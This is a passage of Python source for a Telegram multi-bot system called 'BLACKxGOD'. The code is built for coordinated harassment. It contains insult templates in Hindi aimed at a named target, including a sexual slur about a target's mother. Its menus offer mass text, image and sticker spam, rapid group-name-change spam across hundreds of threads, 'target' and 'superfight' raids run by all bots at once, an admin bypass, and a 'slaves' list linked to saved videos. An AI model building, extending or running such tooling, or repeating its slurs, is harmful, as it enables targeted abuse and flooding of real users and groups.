    "🔥 𝐉𝐨 𝐌𝐞𝐫𝐞 𝐒𝐚𝐚𝐭𝐡 𝐋𝐚𝐝𝐭𝐚 𝐇𝐚𝐢 𝐔𝐬𝐞 𝐇𝐚𝐚𝐫 𝐌𝐢𝐥𝐭𝐢 𝐇𝐚𝐢 — 𝐓𝐞𝐫𝐢 𝐁𝐚𝐚𝐫𝐢 𝐀𝐚 𝐆𝐚𝐲𝐢 ☠️👊",
    "⚔️ 𝐁𝐋𝐀𝐂𝐊 𝐊𝐚 𝐁𝐚𝐝𝐥𝐚 𝐋𝐞𝐭𝐚 𝐇𝐚𝐢 — 𝐒𝐨𝐨𝐧 𝐀𝐚 𝐑𝐚𝐡𝐚 𝐇𝐚𝐢 💀🔥",
    "🌋 𝐓𝐮𝐧𝐞 𝐆𝐚𝐥𝐭𝐢 𝐊𝐚𝐫 𝐃𝐢 — 𝐀𝐛 𝐃𝐞𝐤𝐡𝐨 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 𝐊𝐚 𝐀𝐧𝐝𝐚𝐳 😤💣",
    "💀 𝐓𝐮𝐧𝐞 𝐒𝐨𝐜𝐡𝐚 𝐓𝐡𝐚 𝐁𝐚𝐜𝐡 𝐉𝐚𝐞𝐠𝐚 — 𝐌𝐚𝐧𝐬𝐮𝐫𝐢 𝐒𝐚𝐛 𝐃𝐞𝐤𝐡𝐭𝐚 𝐇𝐚𝐢 👁️⚡",
    "👹 𝐅𝐢𝐠𝐡𝐭𝐛𝐚𝐜𝐤 𝐌𝐨𝐝𝐞 𝐀𝐜𝐭𝐢𝐯𝐞 — 𝐒𝐚𝐫𝐞 𝐁𝐨𝐭𝐬 𝐓𝐚𝐢𝐲𝐚𝐚𝐫 𝐇𝐚𝐢𝐧! 🔱🔥",
]

SUPERFIGHT_TEXTS = [
    "💀🔥 {name} 𝐓𝐞𝐫𝐚 𝐍𝐚𝐚𝐦 𝐒𝐮𝐧𝐭𝐞 𝐇𝐢 𝐇𝐚𝐬𝐢 𝐀𝐚𝐭𝐢 𝐇𝐚𝐢 💀🔥",
    "⚡☠️ {name} 𝐊𝐨𝐢 𝐁𝐡𝐢 𝐓𝐡𝐚𝐥𝐢 𝐔𝐭𝐡𝐚𝐚𝐧𝐞 𝐍𝐚𝐡𝐢 𝐃𝐞𝐭𝐚 𝐓𝐞𝐫𝐞 𝐒𝐚𝐚𝐭𝐡 ⚡☠️",
    "👑💥 𝐁𝐋𝐀𝐂𝐊 𝐊𝐈 𝐅𝐀𝐔𝐉 𝐕𝐒 {name} — 1000-0 👑💥",
    "🔱🩸 {name} 𝐓𝐞𝐫𝐚 𝐑𝐞𝐬𝐮𝐦𝐞: 𝐋𝐨𝐬𝐞𝐫, 𝐅𝐚𝐚𝐥𝐭𝐮, 𝐏𝐡𝐞𝐤𝐭𝐮 🔱🩸",
    "😈⚔️ {name} 𝐕𝐒 𝐒𝐚𝐛 𝐁𝐨𝐭𝐬 — 𝐄𝐤 𝐓𝐚𝐫𝐚𝐟 {name}, 𝐃𝐨𝐨𝐬𝐫𝐢 𝐓𝐚𝐫𝐚𝐟 𝐅𝐚𝐮𝐣 😈⚔️",
    "🏴☠️ {name} 𝐓𝐞𝐫𝐢 𝐙𝐢𝐧𝐝𝐠𝐢 𝐄𝐤 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐄𝐫𝐫𝐨𝐫 𝐇𝐚𝐢 🏴☠️",
    "💣🔔 𝐒𝐔𝐏𝐄𝐑 𝐁𝐎𝐌𝐁! {name} 𝐊𝐨 𝐒𝐮𝐧𝐚𝐨 𝐀𝐛 𝐊𝐲𝐚 𝐇𝐨𝐭𝐚 𝐇𝐚𝐢! 💣🔔",
    "🌋👊 {name} 𝐓𝐮 𝐄𝐤 𝐁𝐚𝐫 𝐀𝐚𝐚𝐣𝐚 𝐒𝐚𝐦𝐧𝐞 — 𝐒𝐚𝐛 𝐁𝐨𝐭𝐬 𝐓𝐚𝐢𝐲𝐚𝐚𝐫 𝐇𝐚𝐢𝐧! 🌋👊",
    "☠️🔥 {name} 𝐊𝐚𝐚𝐥 𝐊𝐞 𝐌𝐮𝐧𝐡 𝐌𝐞𝐢𝐧 𝐁𝐡𝐢 𝐓𝐞𝐫𝐞 𝐣𝐢𝐭𝐧𝐢 𝐇𝐢𝐦𝐦𝐚𝐭 𝐍𝐚𝐡𝐢𝐧 ☠️🔥",
    "💀⚡ {name} 𝐓𝐞𝐫𝐚 𝐃𝐮𝐬𝐡𝐦𝐚𝐧 𝐁𝐡𝐢 𝐓𝐮𝐣𝐡𝐬𝐞 𝐁𝐞𝐡𝐭𝐚𝐫 𝐇𝐚𝐢 — 𝐒𝐨𝐜𝐡 𝐙𝐚𝐫𝐚 💀⚡",
    "🔥👹 𝐒𝐔𝐏𝐄𝐑 𝐅𝐈𝐆𝐇𝐓! {name} 𝐊𝐨 𝐒𝐚𝐫𝐞 𝐁𝐨𝐭𝐬 𝐄𝐤 𝐒𝐚𝐚𝐭𝐡 𝐔𝐝𝐚𝐚𝐭𝐞 𝐇𝐚𝐢𝐧! 🔥👹",
    "⚔️💣 {name} 𝐁𝐡𝐚𝐠 𝐁𝐡𝐚𝐠 𝐁𝐡𝐚𝐠 — 𝐒𝐚𝐛 𝐁𝐨𝐭𝐬 𝐏𝐞𝐞𝐜𝐡𝐡𝐞 𝐇𝐚𝐢𝐧 ⚔️💣",
    "🩸🔱 {name} 𝐓𝐞𝐫𝐚 𝐊𝐞𝐬𝐬 𝐓𝐨𝐡 𝐁𝐚𝐧𝐝 𝐇𝐨 𝐆𝐚𝐲𝐚 — 𝐀𝐛 𝐂𝐡𝐮𝐩 𝐑𝐚𝐡 🩸🔱",
    "😤💥 {name} 𝐓𝐮𝐧𝐞 𝐖𝐚𝐫 𝐌𝐚𝐧𝐠𝐚 𝐓𝐡𝐚 — 𝐌𝐢𝐥𝐚 𝐓𝐮𝐣𝐡𝐞 𝐖𝐀𝐑! 😤💥",
    "👑☠️ 𝐁𝐋𝐀𝐂𝐊 𝐅𝐀𝐔𝐉 𝐊𝐀 𝐑𝐔𝐋𝐄: {name} = 𝐃𝐮𝐬𝐡𝐦𝐚𝐧 = 𝐊𝐡𝐚𝐭𝐚𝐦 👑☠️",
]

NCEMO_EMOJIS = [
    "🗿","👑","🩵","🔱","🌷","❤️‍🩹","👞","🤮","🤣","😭","💔","🥺",
    "😁","👿","🚀","🔥","🥹","😬","🙄","😎","👽","👾","😈","👹",
    "🤡","👋🏿","🤞🏿","🙀","👌🏿","🤟🏿","🐒","🦁","🐅","🦓","🐮"
]

FLAGNC_EMOJIS = [
    "🇮🇳", "🇵🇰", "🇦🇫", "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇩🇪", "🇫🇷", "🇮🇹",
    "🇯🇵", "🇰🇷", "🇧🇷", "🇷🇺", "🇿🇦", "🇲🇽", "🇪🇸", "🇸🇦", "🇹🇷", "🇮🇩"
]

HEARTNC_EMOJIS = [
    "❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", "🤎", "💔",
    "❤️‍🔥", "❤️‍🩹", "❣️", "💕", "💞", "💓", "💗", "💖", "💘", "💝"
]

AESTHETICNC_EMOJIS = [
    "🕊️", "🤍", "🌸", "🎀", "🦢", "🐚", "🩰", "☁️", "✨", "🧊", "🎐", "💎", "🦋", "🍃", "🧸"
]

VEGETABLENC_EMOJIS = [
    "🥬", "🥦", "🌽", "🥕", "🫑", "🥒", "🍆", "🍅", "🥔", "🧄", "🧅", "🥜", "🫒"
]

ANIMALNC_EMOJIS = [
    "🐶", "🐱", "🐭", "🐹", "🐰", "🦊", "🐻", "🐼", "🐨", "🐯",
    "🦁", "🐮", "🐷", "🐸", "🐵", "🐒", "🐔", "🐧", "🐦", "🐤"
]

EXONC_TEXTS = ["💀", "🔥", "⚡", "🎯", "💥", "👑", "🔱", "💫", "⭐", "🌟", "✨", "🎀", "❤️", "🖤"]

VOICE_CHARACTERS = {}

ALL_NC_TEXT = "𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃"
ALL_SPAM_TEXT = "𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 👑🔱"

SPAM_TEMPLATE = [
    "🦅 {target} 𝐊ɪ 𝐌ᴀᴀ 𝐑ᴀɴᴅ ʜᴀɪ 🧊❤️‍🔥",
    "⚡ {hater} 𝐓ᴇʀɪ 𝐀ᴜᴋᴀᴛ ɴᴀʜɪ 💀🔥",
    "💀 {target} 𝐀ᴜᴋᴀᴛ ᴅᴇᴋʜ ᴋᴜᴛᴛᴇ 🐕😂",
]

SUDO_USERS = set(OWNER_IDS)
global_delay = 0.05
spam_delay = 0.5
fight_delay = 0.1
global_mode = False
MAX_THREADS = 500
current_threads = 70
bot_usernames = []
sudo_usernames = {}
setmphoto_data = {}
custom_layout = ""
LAYOUT_FILE = "layout.json"
NOTES_FILE = "notes.json"
WARNS_FILE = "warns.json"
SEEN_USERS_FILE = "seen_users.json"
MAX_WARNS = 3

notes_store = {}
warns_store = {}
seen_users = {}

# Anti-delete
antidelete_chats = set()
msg_cache = {}  # {chat_id: list of dicts}

# Watchspam (flood control)
watchspam_config = {}   # {chat_id: {"threshold": 5, "window": 5, "mute_mins": 10}}
watchspam_chats = set()
flood_tracker = {}       # {(chat_id, user_id): [timestamps]}

# Antispam keywords
antispam_words = {}     # {chat_id: [words]}

# Welcome system
welcome_messages = {}   # {chat_id: "text"}
welcome_chats = set()

# Anti-link
antilink_chats = set()

# Anti-forward
antiforward_chats = set()

# Raid mode
raidmode_chats = set()

# Group lock
locked_chats = set()

# Global ban
gban_users = set()
GBAN_FILE = "gbans.json"

# Auto-trigger (custom keyword → reply)
triggers = {}           # {chat_id: {keyword: reply_text}}

# Chat stats / leaderboard
chat_stats = {}         # {chat_id: {user_id: count}}

# Auto-delete timer
autodelete_config = {}  # {chat_id: seconds}

# Slide targets (with commands to manage them)
SLIDE_FILE = "slide_targets.json"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────
#  GNC SYSTEM
# ─────────────────────────────────────────────────
GNC_PREFIXES = [
    "🌈₊˚🎀⊹♡🌻✨", "👑⋆˚࿔⚡︎𖤐🔥", "☠︎︎⋆༒︎𖤐⛧⚚",
    "𓂃˚✦₊˚𓆩♡𓆪", "⚡︎⋆𖤐☠︎︎👑🔥", "🎮⋆👾🎧⚡︎🕹️",
    "𓂀☥𓋹𓁈𓆣", "💀⃤༒︎𖤐⚚⛧", "☁️⋆｡˚🕊️✨♡",
    "🦋⃤♡⃤🌙✧☁️", "🔱⚡︎𖤐👑⛧", "🌊⋆🐚𓇼✨🫧", "🩸༒︎☠︎︎⚚𖤓",
]
GNC_SUFFIXES = [
    "👑⚡️👑✨🔥👑", "🌷🫧💭₊˚ෆ🌷͙֒₊˚🎧⊹♡",
    "𓊆🤍𓊇🕊️⊹˚🎀", "𓂃 ࣪˖🐇🦋🪐⋆⭒˚",
    "⚡︎🌃𓍙🍾🌟🥂", "ೀ⋅⁀➴🌻✨🎀⊹♡",
    "𓂀☥𓋹𓁈𓆣𓂀☥", "💀⚚☠︎︎⛧☣💀",
    "☁️✨🕊️♡☁️✨", "🦋🌙✧☁️🦋🌙",
    "🔱⚡︎👑⛧🔱⚡︎", "🌊🐚𓇼✨🫧🌊",
    "🩸☠︎︎⚚𖤓🩸☠︎︎",
]
GNC_STYLES = {
    "keng":      (1,  0,  "👑 Kᴇɴɢ Nᴄ"),
    "aesthetic": (3,  3,  "✨ Aᴇsᴛʜᴇᴛɪᴄ"),
    "dark":      (2,  2,  "☠️ Dᴀʀᴋ Nᴄ"),
    "cute":      (0,  1,  "🌈 Cᴜᴛᴇ Nᴄ"),
    "neon":      (4,  4,  "⚡ Nᴇᴏɴ Nᴄ"),
    "gamer":     (5,  5,  "🎮 Gᴀᴍᴇʀ Nᴄ"),
    "mythic":    (6,  6,  "🔱 Mʏᴛʜɪᴄ"),
    "glitch":    (7,  7,  "💀 Gʟɪᴛᴄʜ"),
    "soft":      (9,  9,  "🦋 Sᴏꜰᴛ Nᴄ"),
    "crown":     (10, 10, "🔥 Cʀᴏᴡɴ Nᴄ"),
}
_GNC_STYLE_ORDER = ["keng","aesthetic","dark","cute","neon","gamer","mythic","glitch","soft","crown"]

def _gnc_keyboard(uid):
    keyboard = []
    for i in range(0, len(_GNC_STYLE_ORDER), 2):
        row = []
        for key in _GNC_STYLE_ORDER[i:i+2]:
            lbl = GNC_STYLES[key][2]
            row.append(InlineKeyboardButton(lbl, callback_data=f"gnc_{uid}_{key}"))
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_main")])
    return InlineKeyboardMarkup(keyboard)

def _gnc_format(text, style_key):
    pi, si, _ = GNC_STYLES[style_key]
    return f"{GNC_PREFIXES[pi]} {text} {GNC_SUFFIXES[si]}"

gnc_cache = {}
swipe_names = {}
react_mode = {}
dreact_mode = {}
group_tasks = {}
spam_tasks = {}
pfp_tasks = {}
swipe_tasks = {}
slide_targets = set()
slidespam_targets = set()
target_names = {}

# ─────────────────────────────────────────────────
#  DATA LOAD / SAVE
# ─────────────────────────────────────────────────
def load_data():
    global SUDO_USERS, sudo_usernames, custom_layout
    if os.path.exists(SUDO_FILE):
        try:
            with open(SUDO_FILE, "r") as f:
                data = json.load(f)
                if isinstance(data, list):
                    SUDO_USERS.update(data)
        except: pass
    if os.path.exists("sudo_names.json"):
        try:
            with open("sudo_names.json", "r") as f:
                sudo_usernames.update(json.load(f))
        except: pass
    for uid in SUDO_USERS:
        if str(uid) not in sudo_usernames:
            sudo_usernames[str(uid)] = "User_" + str(uid)
    if os.path.exists(LAYOUT_FILE):
        try:
            with open(LAYOUT_FILE, "r") as f:
                custom_layout = json.load(f).get("layout", "")
        except: pass

def save_sudo():
    with open(SUDO_FILE, "w") as f: json.dump(list(SUDO_USERS), f)
    with open("sudo_names.json", "w") as f: json.dump(sudo_usernames, f)

SLAVES_FILE = "slaves.json"
slaves_list = []

def load_slaves():
    global slaves_list
    if os.path.exists(SLAVES_FILE):
        try:
            with open(SLAVES_FILE, "r") as f:
                data = json.load(f)
            migrated = []
            for item in data:
                if isinstance(item, str):
                    migrated.append({"name": item, "videos": []})
                else:
                    migrated.append(item)
            slaves_list = migrated
        except:
            slaves_list = []

def save_slaves():
    with open(SLAVES_FILE, "w") as f:
        json.dump(slaves_list, f)

def load_notes():
    global notes_store
    if os.path.exists(NOTES_FILE):
        try:
            with open(NOTES_FILE) as f:
                notes_store = json.load(f)
        except: notes_store = {}

def save_notes():
    with open(NOTES_FILE, "w") as f:
        json.dump(notes_store, f)

def load_warns():
    global warns_store
    if os.path.exists(WARNS_FILE):
        try:
            with open(WARNS_FILE) as f:
                warns_store = json.load(f)
        except: warns_store = {}

def save_warns():
    with open(WARNS_FILE, "w") as f:
        json.dump(warns_store, f)

def load_seen_users():
    global seen_users
    if os.path.exists(SEEN_USERS_FILE):
        try:
            with open(SEEN_USERS_FILE) as f:
                seen_users = json.load(f)
        except: seen_users = {}

def save_seen_users():
    with open(SEEN_USERS_FILE, "w") as f:
        json.dump(seen_users, f)

# ─────────────────────────────────────────────────
#  PERMISSION DECORATOR
# ─────────────────────────────────────────────────
def only_sudo(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message: return
        if update.effective_user.id not in SUDO_USERS:
            await update.message.reply_text(UNAUTHORIZED_MESSAGE)
            return
        return await func(update, context)
    return wrapper

# ─────────────────────────────────────────────────
#  BEAUTIFUL INTERACTIVE MENU SYSTEM
# ─────────────────────────────────────────────────

MENU_WELCOME = (
    "╔══════════════════════════╗\n"
    "║  👑 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 👑  ║\n"
    "║   💀 𝐌𝐮𝐥𝐭𝐢-𝐁𝐨𝐭 𝐒𝐲𝐬𝐭𝐞𝐦 💀   ║\n"
    "╚══════════════════════════╝\n\n"
    "⚡ 𝐒𝐞𝐥𝐞𝐜𝐭 𝐚 𝐜𝐚𝐭𝐞𝐠𝐨𝐫𝐲 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐞𝐱𝐩𝐥𝐨𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬:"
)

MENU_SECTIONS = {
    "utilities": {
        "title": "🛠️ 𝐔𝐭𝐢𝐥𝐢𝐭𝐢𝐞𝐬",
        "text": (
            "╭━━━━〔 🛠️ 𝐔𝐓𝐈𝐋𝐈𝐓𝐈𝐄𝐒 〕━━━━╮\n"
            "│\n"
            "│  /ping      ⤷ ⚡ 𝐂𝐡𝐞𝐜𝐤 𝐋𝐚𝐭𝐞𝐧𝐜𝐲\n"
            "│  /status    ⤷ 📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬\n"
            "│  /refresh   ⤷ 🔄 𝐑𝐞𝐥𝐨𝐚𝐝 𝐀𝐥𝐥\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "nc": {
        "title": "⚡ 𝐍𝐜 𝐌𝐨𝐝𝐞",
        "text": (
            "╭━━━━〔 ⚡ 𝐍𝐂 𝐌𝐎𝐃𝐄 〕━━━━╮\n"
            "│\n"
            "│  /godspeed <TEXT>  ⤷ 🚀 𝐔𝐥𝐭𝐫𝐚 𝐍𝐜\n"
            "│  /stopnc           ⤷ 🛑 𝐒𝐭𝐨𝐩 𝐍𝐜\n"
            "│  /delaync <SEC>    ⤷ ⏳ 𝐒𝐞𝐭 𝐃𝐞𝐥𝐚𝐲\n"
            "│  /threads <NUM>    ⤷ 🧵 𝐒𝐞𝐭 𝐓𝐡𝐫𝐞𝐚𝐝𝐬\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "emojinc": {
        "title": "🎀 𝐄𝐦𝐨𝐣𝐢 𝐍𝐜",
        "text": (
            "╭━━━━〔 🎀 𝐄𝐌𝐎𝐉𝐈 𝐍𝐂 〕━━━━╮\n"
            "│\n"
            "│  /flagnc       ⤷ 🚩 𝐅𝐥𝐚𝐠 𝐍𝐜\n"
            "│  /heartnc      ⤷ 💘 𝐇𝐞𝐚𝐫𝐭 𝐍𝐜\n"
            "│  /aestheticnc  ⤷ 🎀 𝐀𝐞𝐬𝐭𝐡𝐞𝐭𝐢𝐜\n"
            "│  /vegetablenc  ⤷ 🥬 𝐕𝐞𝐠𝐠𝐢𝐞 𝐍𝐜\n"
            "│  /animalnc     ⤷ 🐺 𝐀𝐧𝐢𝐦𝐚𝐥 𝐍𝐜\n"
            "│  /timenc       ⤷ ⏱️ 𝐓𝐢𝐦𝐞 𝐍𝐜\n"
            "│  /kengnc       ⤷ ✨ 𝐁𝐋𝐀𝐂𝐊 𝐍𝐜\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "gnc": {
        "title": "🎨 𝐆𝐧𝐜 𝐆𝐞𝐧",
        "text": (
            "╭━━━━〔 🎨 𝐆𝐍𝐂 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑 〕━━━━╮\n"
            "│\n"
            "│  /gnc <TEXT>   ⤷ ✨ 𝐆𝐞𝐧 𝐰𝐢𝐭𝐡 𝟏𝟎 𝐒𝐭𝐲𝐥𝐞𝐬\n"
            "│\n"
            "│  𝐒𝐭𝐲𝐥𝐞𝐬 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞:\n"
            "│  👑 Keng  ✨ Aesthetic  ☠️ Dark\n"
            "│  🌈 Cute  ⚡ Neon  🎮 Gamer\n"
            "│  🔱 Mythic  💀 Glitch\n"
            "│  🦋 Soft  🔥 Crown\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "spam": {
        "title": "😹 𝐒𝐩𝐚𝐦 𝐙𝐨𝐧𝐞",
        "text": (
            "╭━━━━〔 😹 𝐒𝐏𝐀𝐌 𝐙𝐎𝐍𝐄 〕━━━━╮\n"
            "│\n"
            "│  /spam <TEXT>      ⤷ 💬 𝐒𝐭𝐚𝐫𝐭 𝐒𝐩𝐚𝐦\n"
            "│  /unspam           ⤷ 🛑 𝐒𝐭𝐨𝐩 𝐒𝐩𝐚𝐦\n"
            "│  /imagespam        ⤷ 🖼️ 𝐈𝐦𝐚𝐠𝐞 𝐒𝐩𝐚𝐦\n"
            "│  /stickerspam      ⤷ 🎭 𝐒𝐭𝐢𝐜𝐤𝐞𝐫 𝐒𝐩𝐚𝐦\n"
            "│  /setmphoto        ⤷ 📸 𝐀𝐭𝐭𝐚𝐜𝐡 𝐏𝐡𝐨𝐭𝐨\n"
            "│  /clearmphoto      ⤷ 🗑️ 𝐂𝐥𝐞𝐚𝐫 𝐏𝐡𝐨𝐭𝐨\n"
            "│  /delayspam <SEC>  ⤷ ⏳ 𝐒𝐞𝐭 𝐃𝐞𝐥𝐚𝐲\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "target": {
        "title": "🎯 𝐓𝐚𝐫𝐠𝐞𝐭",
        "text": (
            "╭━━━━〔 🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐌𝐎𝐃𝐄 〕━━━━╮\n"
            "│\n"
            "│  /target <NAME>           ⤷ 🎯 𝐒𝐞𝐭\n"
            "│  /settemplate <ID> <TEXT> ⤷ 📝 𝐓𝐞𝐦𝐩\n"
            "│  /showtemplate            ⤷ 📜 𝐒𝐡𝐨𝐰\n"
            "│  /spamtarget              ⤷ ⚔️ 𝐒𝐭𝐚𝐫𝐭\n"
            "│  /stoptarget              ⤷ 🛑 𝐒𝐭𝐨𝐩\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "swipereact": {
        "title": "⚔️ 𝐒𝐰𝐢𝐩𝐞/𝐑𝐞𝐚𝐜𝐭",
        "text": (
            "╭━━━━〔 ⚔️ 𝐒𝐖𝐈𝐏𝐄 & 𝐑𝐄𝐀𝐂𝐓 〕━━━━╮\n"
            "│\n"
            "│  /swipe <NAME>       ⤷ ⚔️ 𝐒𝐭𝐚𝐫𝐭 𝐒𝐰𝐢𝐩𝐞\n"
            "│  /stopswipe          ⤷ 🛑 𝐒𝐭𝐨𝐩\n"
            "│  /react <EMOJI>      ⤷ 😍 𝐑𝐞𝐚𝐜𝐭 𝐎𝐧\n"
            "│  /stopreact          ⤷ ❌ 𝐑𝐞𝐚𝐜𝐭 𝐎𝐟𝐟\n"
            "│  /dreact <N> <EMOJI> ⤷ 💥 𝐌𝐮𝐥𝐭𝐢 𝐑𝐞𝐚𝐜𝐭\n"
            "│  /stopdreact         ⤷ 🚫 𝐒𝐭𝐨𝐩\n"
            "│  /akal               ⤷ ☠️ 𝐑𝐞𝐩𝐥𝐲\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "botsettings": {
        "title": "🤖 𝐁𝐨𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬",
        "text": (
            "╭━━━━〔 🤖 𝐁𝐎𝐓 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 〕━━━━╮\n"
            "│\n"
            "│  /Changename <NAME>  ⤷ ✏️ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞\n"
            "│  /changepfp          ⤷ 📷 𝐁𝐨𝐭 𝐏𝐅𝐏\n"
            "│  /setpfp             ⤷ 🖼️ 𝐒𝐞𝐭 𝐏𝐅𝐏\n"
            "│  /getallbots         ⤷ 🤖 𝐋𝐢𝐬𝐭 𝐁𝐨𝐭𝐬\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "tokens": {
        "title": "🔑 𝐓𝐨𝐤𝐞𝐧 𝐌𝐠𝐦𝐭",
        "text": (
            "╭━━━━〔 🔑 𝐓𝐎𝐊𝐄𝐍 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 〕━━━━╮\n"
            "│\n"
            "│  /addtoken <TOKEN>  ⤷ ➕ 𝐍𝐚𝐲𝐚 𝐁𝐨𝐭 𝐋𝐢𝐯𝐞 𝐀𝐝𝐝\n"
            "│  /deltoken <NUM>    ⤷ ❌ 𝐁𝐨𝐭 𝐇𝐚𝐭𝐚𝐨\n"
            "│  /listtokens        ⤷ 📋 𝐒𝐚𝐚𝐫𝐞 𝐁𝐨𝐭𝐬 𝐃𝐞𝐤𝐡𝐨\n"
            "│\n"
            "│  💡 𝐓𝐢𝐩: /addtoken se naya bot\n"
            "│     seedha live add ho jaata hai!\n"
            "│     Script edit karne ki zaroorat\n"
            "│     nahi — save bhi rehta hai! 💾\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "global": {
        "title": "🌐 𝐆𝐥𝐨𝐛𝐚𝐥",
        "text": (
            "╭━━━━〔 🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━━╮\n"
            "│\n"
            "│  /globalactivate  ⤷ 🟢 𝐆𝐥𝐨𝐛𝐚𝐥 𝐎𝐧\n"
            "│  /offglobal       ⤷ 🔴 𝐆𝐥𝐨𝐛𝐚𝐥 𝐎𝐟𝐟\n"
            "│  /leaveglobal     ⤷ 🚪 𝐋𝐞𝐚𝐯𝐞 𝐀𝐥𝐥\n"
            "│  /groups          ⤷ 📋 𝐋𝐢𝐬𝐭 𝐆𝐫𝐨𝐮𝐩𝐬\n"
            "│  /g <CMD>         ⤷ 🌍 𝐆𝐥𝐨𝐛𝐚𝐥 𝐄𝐱𝐞𝐜\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "admin": {
        "title": "🔐 𝐀𝐝𝐦𝐢𝐧/𝐒𝐮𝐝𝐨",
        "text": (
            "╭━━━━〔 🔐 𝐀𝐃𝐌𝐈𝐍 & 𝐒𝐔𝐃𝐎 〕━━━━╮\n"
            "│\n"
            "│  /sudo         ⤷ ➕ 𝐀𝐝𝐝 𝐒𝐮𝐝𝐨\n"
            "│  /delsudo      ⤷ ❌ 𝐃𝐞𝐥 𝐒𝐮𝐝𝐨\n"
            "│  /listsudo     ⤷ 📜 𝐋𝐢𝐬𝐭 𝐒𝐮𝐝𝐨\n"
            "│  /adminbyp     ⤷ ⚡ 𝐁𝐲𝐩𝐚𝐬𝐬\n"
            "│  /giveadmin    ⤷ 👑 𝐆𝐢𝐯𝐞 𝐀𝐝𝐦𝐢𝐧\n"
            "│  /owner        ⤷ 💀 𝐎𝐰𝐧𝐞𝐫 𝐈𝐧𝐟𝐨\n"
            "│\n"
            "│  ━━━ 🆕 𝐆𝐑𝐎𝐔𝐏 𝐒𝐄𝐓𝐔𝐏 ━━━\n"
            "│  /newgroup <naam>       ⤷ 🔗 𝐆𝐫𝐨𝐮𝐩 𝐋𝐢𝐧𝐤𝐬\n"
            "│  /alladmin              ⤷ 👑 𝐒𝐚𝐫𝐞 𝐁𝐨𝐭 𝐅𝐔𝐋𝐋 𝐀𝐃𝐌𝐈𝐍\n"
            "│  /clonegroup [id]       ⤷ 🔁 𝐆𝐫𝐨𝐮𝐩 𝐂𝐥𝐨𝐧𝐞\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "slaves": {
        "title": "⛓️ 𝐒𝐥𝐚𝐯𝐞𝐬",
        "text": (
            "╭━━━━〔 ⛓️ 𝐒𝐋𝐀𝐕𝐄𝐒 〕━━━━╮\n"
            "│\n"
            "│  /slaves              ⤷ 📜 𝐋𝐢𝐬𝐭\n"
            "│  /addslave <NAME>     ⤷ ➕ 𝐀𝐝𝐝\n"
            "│  /delslave <NAME>     ⤷ ❌ 𝐃𝐞𝐥\n"
            "│  /showslave <NUM>     ⤷ 🎥 𝐕𝐢𝐞𝐰\n"
            "│  /saveslave <NUM>     ⤷ 💾 𝐒𝐚𝐯𝐞\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "layout": {
        "title": "🎨 𝐋𝐚𝐲𝐨𝐮𝐭",
        "text": (
            "╭━━━━〔 🎨 𝐋𝐀𝐘𝐎𝐔𝐓 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 〕━━━━╮\n"
            "│\n"
            "│  /Setlayout <TEXT>  ⤷ 🎭 𝐂𝐮𝐬𝐭𝐨𝐦 𝐋𝐚𝐲𝐨𝐮𝐭\n"
            "│  /resetlayout       ⤷ 🔄 𝐑𝐞𝐬𝐞𝐭 𝐋𝐚𝐲𝐨𝐮𝐭\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        ),
    },
    "fighting": {
        "title": "⚔️ 𝐅𝐢𝐠𝐡𝐭𝐢𝐧𝐠",
        "text": (
            "╭━━━━〔 ⚔️ 𝐅𝐈𝐆𝐇𝐓𝐈𝐍𝐆 𝐌𝐎𝐃𝐄 〕━━━━╮\n"
            "│\n"
            "│  /superfight <N>  ⤷ 💥 𝐒𝐔𝐏𝐄𝐑 𝐒𝐏𝐀𝐌 (𝐀𝐋𝐋 𝐁𝐨𝐭𝐬)\n"
            "│  /roast           ⤷ 🔥 𝐑𝐨𝐚𝐬𝐭 (𝐑𝐞𝐩𝐥𝐲)\n"
            "│  /diss <NAME>     ⤷ 🎤 𝐒𝐞𝐧𝐝 𝐃𝐢𝐬𝐬\n"
